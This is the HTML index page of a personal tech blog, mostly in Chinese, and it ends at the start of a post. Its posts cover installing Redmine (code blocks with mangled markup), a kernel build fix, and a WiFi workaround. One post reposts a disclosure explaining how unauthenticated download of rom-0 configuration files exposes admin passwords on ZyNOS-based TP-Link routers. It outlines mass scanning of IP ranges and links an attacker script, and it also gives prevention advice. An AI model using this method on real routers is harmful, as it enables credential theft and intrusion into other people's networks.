<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Frank&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Frank&#39;s Blog">
<meta property="og:url" content="https://fengguoqing.github.io/index.html">
<meta property="og:site_name" content="Frank&#39;s Blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Frank&#39;s Blog">
  
    <link rel="alternate" href="/atom.xml" title="Frank&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Frank&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://fengguoqing.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/11/25/hello-world/" class="article-date">
  <time datetime="2017-11-25T13:44:08.275Z" itemprop="datePublished">2017-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/11/25/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2017/11/25/hello-world/" data-id="cjafig59n0001qrj1sewoqxol" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-在ubuntu上安装redmine" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/20/在ubuntu上安装redmine/" class="article-date">
  <time datetime="2014-04-20T08:33:52.000Z" itemprop="datePublished">2014-04-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/20/在ubuntu上安装redmine/">在ubuntu上安装redmine</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近有一个新项目需要用到项目管理工具，最后准备采用redmine，经过一系列的折腾，终于把它安装完成了，现在将安装过程分享出来，为那些遇到同样问题的同学做个参考。</p>
<p>首先按照<a href="http://www.redmine.org/projects/redmine/wiki/RedmineInstall" target="_blank" rel="noopener">官方网站</a>的步骤来安装，但是仍旧会碰到各种各样的问题。</p>
<p><span id="OSC_h4_1"></span></p>
<h4 id="1-下载Redmine源代码"><a href="#1-下载Redmine源代码" class="headerlink" title="1. 下载Redmine源代码"></a>1. 下载Redmine源代码</h4><p>这里利用git下载：</p>
<pre><code>git&amp;nbsp;clone&amp;nbsp;https://github.com/redmine/redmine`&lt;/pre&gt; 

&lt;span id=&quot;OSC_h4_2&quot;&gt;&lt;/span&gt;

#### 2\. 安装配置MySQL

已经安装过MySQL就不需要执行下面的命令：

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`sudo&amp;nbsp;apt-get&amp;nbsp;install&amp;nbsp;mysql-server&amp;nbsp;mysql-client`&lt;/pre&gt; 

&lt;span style=&quot;font-family: verdana,sans-serif; font-size: 12px; line-height: 15.6px; background-color: rgb(248, 245, 238);&quot;&gt;&lt;/span&gt;配置redmine数据库和用户：

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`mysql&amp;nbsp;-u&amp;nbsp;root&amp;nbsp;-p`&lt;/pre&gt; 

&lt;pre class=&quot;brush:sql;toolbar: true; auto-links: false;&quot;&gt;`CREATE&amp;nbsp;DATABASE&amp;nbsp;redmine&amp;nbsp;CHARACTER&amp;nbsp;SET&amp;nbsp;utf8;
CREATE&amp;nbsp;USER&amp;nbsp;&apos;redmine&apos;@&apos;localhost&apos;&amp;nbsp;IDENTIFIED&amp;nbsp;BY&amp;nbsp;&apos;my_password&apos;;
GRANT&amp;nbsp;ALL&amp;nbsp;PRIVILEGES&amp;nbsp;ON&amp;nbsp;redmine.*&amp;nbsp;TO&amp;nbsp;&apos;redmine&apos;@&apos;localhost&apos;;`&lt;/pre&gt; 

&lt;span id=&quot;OSC_h4_3&quot;&gt;&lt;/span&gt;

#### 3\. 数据库连接配置

首先要将redmine源码中&amp;nbsp;config/database.yml.example复制一份改名为config/database.yml。

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`cp&amp;nbsp;&amp;nbsp;config/database.yml.example&amp;nbsp;config/database.yml`&lt;/pre&gt; 

&lt;span style=&quot;line-height: 22.5px;&quot;&gt;然后再&lt;span style=&quot;line-height: 22.5px;&quot;&gt;根据刚刚创建的redmine数据库&lt;/span&gt;修改&lt;/span&gt;&lt;span style=&quot;line-height: 22.5px;&quot;&gt;config/database.yml：&lt;/span&gt;

&lt;pre class=&quot;brush:xml;toolbar: true; auto-links: false;&quot;&gt;`production:
&amp;nbsp;&amp;nbsp;adapter:&amp;nbsp;mysql
&amp;nbsp;&amp;nbsp;database:&amp;nbsp;redmine
&amp;nbsp;&amp;nbsp;host:&amp;nbsp;localhost
&amp;nbsp;&amp;nbsp;username:&amp;nbsp;redmine
&amp;nbsp;&amp;nbsp;password:&amp;nbsp;&quot;my_password&quot;
&amp;nbsp;&amp;nbsp;encoding:&amp;nbsp;utf8`&lt;/pre&gt; 

&lt;span id=&quot;OSC_h4_4&quot;&gt;&lt;/span&gt;

#### 4\. 安装依赖包

首先得安装ruby和gem,然后使用gem安装bundler，最后通过bundle根据redmine下面的Gemfile安装所有需要安装的软件包。

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`sudo&amp;nbsp;apt-get&amp;nbsp;install&amp;nbsp;ruby&amp;nbsp;rubygems&amp;nbsp;ruby1.8-dev&amp;nbsp;ruby1.9.1-dev&amp;nbsp;libmysqlclient-dev&amp;nbsp;imagemagick&amp;nbsp;libmagickwand-dev
cd&amp;nbsp;redmine
/*&amp;nbsp;由于有GFW的存在，需要使用国内的gem源才能下载，先删除官方源，然后添加淘宝的源&amp;nbsp;*/
gem&amp;nbsp;sources&amp;nbsp;-r&amp;nbsp;http://rubygems.org/
gem&amp;nbsp;source&amp;nbsp;-a&amp;nbsp;http://ruby.taobao.org
sudo&amp;nbsp;gem&amp;nbsp;install&amp;nbsp;bundler&amp;nbsp;-V
bundle&amp;nbsp;install&amp;nbsp;--without&amp;nbsp;development&amp;nbsp;test`&lt;/pre&gt; 

&lt;span id=&quot;OSC_h4_5&quot;&gt;&lt;/span&gt;

#### &lt;span style=&quot;line-height: 22.5px;&quot;&gt;5\. Redmine配置&lt;/span&gt;

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`rake&amp;nbsp;generate_secret_token
RAILS_ENV=production&amp;nbsp;rake&amp;nbsp;db:migrate
RAILS_ENV=production&amp;nbsp;rake&amp;nbsp;redmine:load_default_data`&lt;/pre&gt; 

&lt;span id=&quot;OSC_h4_6&quot;&gt;&lt;/span&gt;

#### 6\. 文件系统权限设置

在Redmine下建立文件夹并设置相应权限

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`mkdir&amp;nbsp;-p&amp;nbsp;tmp&amp;nbsp;tmp/pdf&amp;nbsp;public/plugin_assets
sudo&amp;nbsp;chmod&amp;nbsp;-R&amp;nbsp;755&amp;nbsp;files&amp;nbsp;log&amp;nbsp;tmp&amp;nbsp;public/plugin_assets`&lt;/pre&gt; 

&lt;span id=&quot;OSC_h4_7&quot;&gt;&lt;/span&gt;

#### 7\. 运行测试

至此Redmine就安装完成了，现在就可以运行测试了。运行下面的命令进行测试：

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`ruby&amp;nbsp;script/rails&amp;nbsp;server&amp;nbsp;webrick&amp;nbsp;-e&amp;nbsp;production`&lt;/pre&gt; 

运行上面的服务之后，我们就可以在浏览器中输入http://IP:3000 来测试。如果安装成功就会出现下面的网站界面：

![](http://static.oschina.net/uploads/space/2014/0420/161230_YGrG_579952.png)

&lt;span style=&quot;font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255);&quot;&gt;初始用户名/密码：admin/admin&lt;/span&gt;

&lt;span style=&quot;font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255);&quot;&gt;但是这样启动之后中断窗口是不能关闭的，如果要像服务一样启动，得添加-d参数：
&lt;/span&gt;

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`ruby&amp;nbsp;script/server&amp;nbsp;webrick&amp;nbsp;-e&amp;nbsp;production&amp;nbsp;-d`&lt;/pre&gt; 

&lt;span style=&quot;font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255);&quot;&gt;&lt;span style=&quot;font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255);&quot;&gt;&lt;/span&gt;&lt;/span&gt;如果想要关闭服务，可以通过查看该服务的PID来关闭：

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`cat&amp;nbsp;redmine/tmp/pids/server.pid
kill&amp;nbsp;-9&amp;nbsp;[PID]`&lt;/pre&gt; 

&lt;span style=&quot;font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255);&quot;&gt;&lt;/span&gt;最后在使用redmine过程中发现网络连接很慢，按理说，是局域网内的访问应该很快的，后来调查之后发现是webrick捣的鬼，改用thin就好了。

先在Gemfile文件中添加thin，然后再用bundle安装一下就可以了。

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`vim&amp;nbsp;Gemfile
+#gem&amp;nbsp;&apos;mongrel&apos;,&amp;nbsp;&apos;1.2.0.pre2&apos;
+gem&amp;nbsp;&apos;thin&apos;
bundle&amp;nbsp;install&amp;nbsp;--without&amp;nbsp;development&amp;nbsp;test`&lt;/pre&gt; 

&lt;span style=&quot;font-size: 12.5px;&quot;&gt;&lt;/span&gt;安装之后重新启动redmine服务，访问就快很多了。

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`ruby&amp;nbsp;script/rails&amp;nbsp;server&amp;nbsp;thin&amp;nbsp;-e&amp;nbsp;production&amp;nbsp;-d`&lt;/pre&gt; 

&lt;span id=&quot;OSC_h4_8&quot;&gt;&lt;/span&gt;

#### 8\. 邮件服务配置

邮件服务配置需要修改config/configuration.yml，我的一个可以成功发送邮件的配置是：

&lt;pre class=&quot;brush:xml;toolbar: true; auto-links: false;&quot;&gt;`#&amp;nbsp;default&amp;nbsp;configuration&amp;nbsp;options&amp;nbsp;for&amp;nbsp;all&amp;nbsp;environments
default:
&amp;nbsp;&amp;nbsp;#&amp;nbsp;Outgoing&amp;nbsp;emails&amp;nbsp;configuration&amp;nbsp;(see&amp;nbsp;examples&amp;nbsp;above)
&amp;nbsp;&amp;nbsp;email_delivery:
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;delivery_method:&amp;nbsp;:smtp
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;smtp_settings:
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;address:&amp;nbsp;localhost
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;port:&amp;nbsp;25
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;domain:&amp;nbsp;example.com
#&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;authentication:&amp;nbsp;:login
#&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;user_name:&amp;nbsp;&quot;redmine@example.net&quot;
#&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;password:&amp;nbsp;&quot;redmine&quot;
</code></pre><p>然后重启redmine服务，在管理&gt;&gt;配置&gt;&gt;邮件通知 中选择发送测试邮件进行测试。</p>
<p><span id="OSC_h4_9"></span></p>
<h4 id="9-结语"><a href="#9-结语" class="headerlink" title="9. 结语"></a>9. 结语</h4><p>在整个安装的过程中碰到了很多问题，大部分都是缺少依赖包的，在前面的安装中都已经提示出来了。</p>
<p><span style="font-size: 14px; line-height: 22px; background-color: rgb(255, 255, 255);"><br></span></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2014/04/20/在ubuntu上安装redmine/" data-id="cjafimvv50000vhj1e5lncri7" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/教程/">教程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Linux-kernel-make-menuconfig-时出错处理方法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/" class="article-date">
  <time datetime="2014-04-14T09:53:42.000Z" itemprop="datePublished">2014-04-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/">Linux kernel make menuconfig 时出错处理方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在Ubuntu 12.04的环境下编译最新的linux 3.14代码时出现下面的错误：</p>
<pre><code>$&amp;nbsp;make&amp;nbsp;menuconfig
&amp;nbsp;&amp;nbsp;HOSTLD&amp;nbsp;&amp;nbsp;scripts/kconfig/mconf
scripts/kconfig/mconf.o:&amp;nbsp;In&amp;nbsp;function&amp;nbsp;`show_help&apos;:
mconf.c:(.text+0x8a4):&amp;nbsp;undefined&amp;nbsp;reference&amp;nbsp;to&amp;nbsp;`stdscr&apos;
scripts/kconfig/lxdialog/checklist.o:&amp;nbsp;In&amp;nbsp;function&amp;nbsp;`print_arrows&apos;:
checklist.c:(.text+0x41):&amp;nbsp;undefined&amp;nbsp;reference&amp;nbsp;to&amp;nbsp;`wmove&apos;
checklist.c:(.text+0x61):&amp;nbsp;undefined&amp;nbsp;reference&amp;nbsp;to&amp;nbsp;`acs_map&apos;
......
menubox.c:(.text+0x3a9):&amp;nbsp;undefined&amp;nbsp;reference&amp;nbsp;to&amp;nbsp;`wrefresh&apos;
scripts/kconfig/lxdialog/menubox.o:&amp;nbsp;In&amp;nbsp;function&amp;nbsp;`print_buttons&apos;:
menubox.c:(.text+0x4ef):&amp;nbsp;undefined&amp;nbsp;reference&amp;nbsp;to&amp;nbsp;`wrefresh&apos;
collect2:&amp;nbsp;ld&amp;nbsp;returned&amp;nbsp;1&amp;nbsp;exit&amp;nbsp;status
make[1]:&amp;nbsp;***&amp;nbsp;[scripts/kconfig/mconf]&amp;nbsp;Error&amp;nbsp;1
make:&amp;nbsp;***&amp;nbsp;[menuconfig]&amp;nbsp;Error&amp;nbsp;2`&lt;/pre&gt; 

&lt;span style=&quot;line-height: 23px;&quot;&gt;由于缺少必要的package，所以出现了编译问题。&lt;/span&gt;

&lt;span style=&quot;font-size: 12.5px;&quot;&gt;出现这个问题的处理方法：&lt;/span&gt;

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`sudo&amp;nbsp;apt-get&amp;nbsp;install&amp;nbsp;build-essential&amp;nbsp;libncurses5&amp;nbsp;libncurses5-dev
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/" data-id="cjafihzia0000rnj14pamffw9" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux移植/">linux移植</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-解决三星手机WIFI“此网络不可用。证书已到期”方法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/" class="article-date">
  <time datetime="2014-02-15T10:11:22.000Z" itemprop="datePublished">2014-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/">解决三星手机WIFI“此网络不可用。证书已到期”方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&nbsp;&nbsp;&nbsp;&nbsp;最近三星手机升级到了4.3，但是升级完了之后WIFI就出现了问题，有时候根本就连不上，有时候连上了还要弹出一个网页登陆，登陆完之后，用一会就自己断掉了，弹出通知说“此网络不可用。证书已到期”，无法自动重连。没有升级之前都是很好用的。试了很多办法，比如重启手机，重启路由器，忘记密码重新登陆，都没有作用。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;后来想到了给WIFI热点重新起一个名字，作为一个新的WIFI热点来登陆，后来果然就可以正常使用了，可能是升级前后证书有所改变，所以原来的WIFI无法继续登陆了。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;希望可以帮助碰到相同问题的同学。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/" data-id="cjafilfyb0000ubj1i3pxcq6g" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常记录/">日常记录</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-某些TP-Link路由器可以被远程获取密码" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/01/19/某些TP-Link路由器可以被远程获取密码/" class="article-date">
  <time datetime="2014-01-19T09:59:38.000Z" itemprop="datePublished">2014-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/01/19/某些TP-Link路由器可以被远程获取密码/">某些TP-Link路由器可以被远程获取密码</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLOSURE"><a href="#HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLOSURE" class="headerlink" title="HOW I SAVED YOUR A** FROM THE ZYNOS (ROM-0) ATTACK !! ( FULL DISCLOSURE )"></a>HOW I SAVED YOUR A** FROM THE ZYNOS (ROM-0) ATTACK !! ( FULL DISCLOSURE )</h4><p>Hello everyone, I just wanted to discuss some vulnerability I found and exploited for GOODNESS .. just so that SCRIPT KIDIES won’t attack your home/business network .</p>
<p>Well, in Algeria the main ISP ( Algerie Telecom ) provide you with a router when you pay for an internet plan. So you can conclude that every subscriber is using that router . TD-W8951ND is one of them, I did some ip scanning and I found that every router is using ZYXEL embedded firmware.</p>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis :"></a><strong>Analysis :</strong></h3><p>Let’s download an update and take a look at it and try to find some vulnerabilities. ( <a href="http://www.tp-link.com/Resources/software/TD-W8951ND_V3.0_110729_FI.rar" target="_blank" rel="noopener">http://www.tp-link.com/Resources/software/TD-W8951ND_V3.0_110729_FI.rar </a>)</p>
<p><a href="http://static.oschina.net/uploads/img/201401/19175934_8zu4.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175934_qaNU.jpg" alt="lif" title="lif"></a></p>
<p>The ras file is in LIF format !! … &nbsp; &nbsp;<br>Hmmm let’s put that file for Binwalk test for God’s sake ! ( check :<a href="http://code.google.com/p/binwalk/wiki/Installation" target="_blank" rel="noopener">http://code.google.com/p/binwalk/wiki/Installation</a> for more informations on how to install it ).</p>
<p>This is what Binwalk told me about that file : &nbsp; &nbsp;<br><a href="http://static.oschina.net/uploads/img/201401/19175934_veKb.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175934_svCo.jpg" alt="zynos" title="zynos"></a></p>
<p>You can clearly see and confirm that the router is using zynos firmware. We can also see that there is two blocks of LZMA compressed data … let’s extract them and have a look. &nbsp; &nbsp;<br><a href="http://static.oschina.net/uploads/img/201401/19175935_0q2n.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175935_6pIO.jpg" alt="extract1" title="extract1"></a></p>
<p>The problem is that when I tried to decompress the two blocks I get an error : ” Compressed data is corrupt “</p>
<p><a href="http://static.oschina.net/uploads/img/201401/19175935_xf7b.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175935_U9nN.jpg" alt="error" title="error"></a></p>
<p>Hmm, first the “ras” file was in LIF format .. and now the lzma compress blocks are corrupted !! &nbsp; &nbsp;<br>I googled this and tried to find a solution for this, <strong>FOUND NOTHING</strong> . How am I going to solve this ?? &nbsp; &nbsp;<br>One idea came in my mind .. “Strings” command and here is what I got :</p>
<p><a href="http://static.oschina.net/uploads/img/201401/19175935_cqNB.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_vM18.jpg" alt="strings" title="strings"></a></p>
<p>Aaaah ! so the blocks aren’t compressed with LZMA or anything ! and the whole “ras” firmware file is just big chunk of data in clear text. &nbsp; &nbsp;<br>Ok, let’s try and find some useful STRINGS …</p>
<p>After some time searching “I” didn’t find the useful thing that will help us find vulnerabilities on the firmware !!</p>
<p>I didn’t give up … &nbsp; &nbsp;<br>I just was thinking and questioning :</p>
<ul>
<li><p>Me: What do you want from this firmware file !</p>
</li>
<li><p>Me: I want to find remote vulnerabilities that will help me extract the “admin” password.</p>
</li>
<li><p>Me: Does the web interface let you save the current configuration ? </p>
</li>
</ul>
<p><a href="http://static.oschina.net/uploads/img/201401/19175936_Jez1.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_PIlE.jpg" alt="rom-save" title="rom-save"></a></p>
<ul>
<li><p>Me: yes !!</p>
</li>
<li><p>Me: Is the page password protected ? </p>
</li>
</ul>
<p><a href="http://static.oschina.net/uploads/img/201401/19175936_T61n.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_ypc5.jpg" alt="password-protected" title="password-protected"></a></p>
<ul>
<li>Me: No !!! I tired to access that page on a different IP and it didn’t require a passowrd ! </li>
</ul>
<p>Ok, enough questions haha ..</p>
<p>Now, when I activated TamperData and clicked “ROMFILE SAVE”&amp;#160; I’ve found out that the rom-0 file is located on “IP/rom-0″ and the directory isn’t password protected or anything.</p>
<p>So we are able to download the configuration file which contains the “admin” password. I took a look at rom-0 file and couldn’t figure out how to reverse-engineer it, and when you don’t know something it’s not a shame to ask for help .. and that’s what I did ! &nbsp; &nbsp;<br>I contacted “<strong>Craig</strong>” from <a href="http://devttys0.com/" target="_blank" rel="noopener">devttys0.com</a>, he is an expect when it comes to hacking embdded devices . He’s a great guy and he replied to my email and pointed me to <a href="http://50.57.229.26/zynos.php" target="_blank" rel="noopener">http://50.57.229.26/zynos.php</a>which is a free rom-0 file decompressor .</p>
<p><a href="http://static.oschina.net/uploads/img/201401/19175937_whRc.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175937_NJ9G.jpg" alt="decompress" title="decompress"></a></p>
<p>When you upload and submit the rom-0 file there, the php page replies back with the configuration in clear text ( <strong>INCLUDING THE PASSWORD</strong> ) .</p>
<p>So what i need to do now is to automate the process of :</p>
<ul>
<li><p>Download rom-0 file.</p>
</li>
<li><p>Upload it to <a href="http://50.57.229.26/zynos.php" target="_blank" rel="noopener">http://50.57.229.26/zynos.php</a></p>
</li>
<li><p>get the repy back and extract the admin password from it.</p>
</li>
<li><p>loop this process to a range of ip addresses. </p>
</li>
</ul>
<p>And that’s exactly what I did, I opened an OLD OLD poc python script of mine that accessed routers via telnet using the default passwords. So what I just need to do now is to add some functionality to it.</p>
<p>Well I thought about&amp;#160; this, and I’m posting this script online <strong>ONLY FOR EDUCATIONAL PURPOSES.</strong></p>
<p>You can find the scripts here : <a href="https://github.com/MrNasro/zynos-attacker/" target="_blank" rel="noopener">https://github.com/MrNasro/zynos-attacker/</a></p>
<p>Demo :</p>
<p><a href="http://static.oschina.net/uploads/img/201401/19175937_xoJZ.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175937_vATX.jpg" alt="demo" title="demo"></a></p>
<p><strong>PS : I OWN ALL THE IP RANGE I WAS SCANNING ” FOR SURE <img src="http://static.oschina.net/uploads/img/201401/19180126_0Zrk.gif" alt=";)"> “</strong></p>
<h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention :"></a>Prevention :</h3><p>Now ! how do you prevent attackers from downloading your rom-0 configuration file and manipulating your router ? This is pretty simple if you think about it .. &nbsp; &nbsp;<br>You just have to forward port 80 on the router to and inused IP address on your network : &nbsp; &nbsp;<br><a href="http://static.oschina.net/uploads/img/201401/19175937_XPrm.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175938_gdlc.jpg" alt="forward" title="forward"></a></p>
<p><strong>THATS ALL, </strong>or if you want to play a little with attackers that are using scripts too .. just forward port 80 to you local http server and put a LARGE file in the root directory and name it rom-0 .. just let them download like 1GB rom-0 file haha haha .. I have also automated the process of port forwarding and I’m running the scripts daily just to prevent hackers from attacking weak users …</p>
<p>In the next post I’ll demonstrate how would a malicious hacker exploit this to hack TONS of networks and get a meterpreter/reverse_shell on every PC on the target network ..</p>
<p>Hope you enjoyed this analysis, if you have anything to add or any questions to ask don’t hesitate to contact me ! <strong>BE THEIR HERO, HAPPY HACKING <img src="http://static.oschina.net/uploads/img/201401/19180126_0Zrk.gif" alt=";)"></strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2014/01/19/某些TP-Link路由器可以被远程获取密码/" data-id="cjafilrgr0000ulj1jqhyrrcz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/系统安全/">系统安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-生成和打上patch的方法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/12/02/生成和打上patch的方法/" class="article-date">
  <time datetime="2013-12-02T05:24:16.000Z" itemprop="datePublished">2013-12-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/12/02/生成和打上patch的方法/">生成和打上patch的方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
